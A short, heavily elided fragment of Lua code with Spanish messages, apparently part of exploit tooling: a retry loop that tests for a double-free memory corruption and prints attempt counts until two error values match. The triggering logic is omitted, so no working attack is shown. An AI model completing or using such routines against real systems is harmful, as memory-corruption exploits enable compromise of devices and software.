...
function double_free_test()
    ...
    while true do
        ...
        for _ = 1, 1000 do end -- pequeño delay
        ...
        print(string.format("Intento Numero %d: 0x%X | 0x%X", attempts, err0, err1))

        if err0 == err1 then
            print(string.format("Double Free archivado OK despues de %d intentos!", attempts))
            notify(string.format("✅ Double Free Archivado OK despues de %d intentos!", attempts))
            return
        end
    end
end
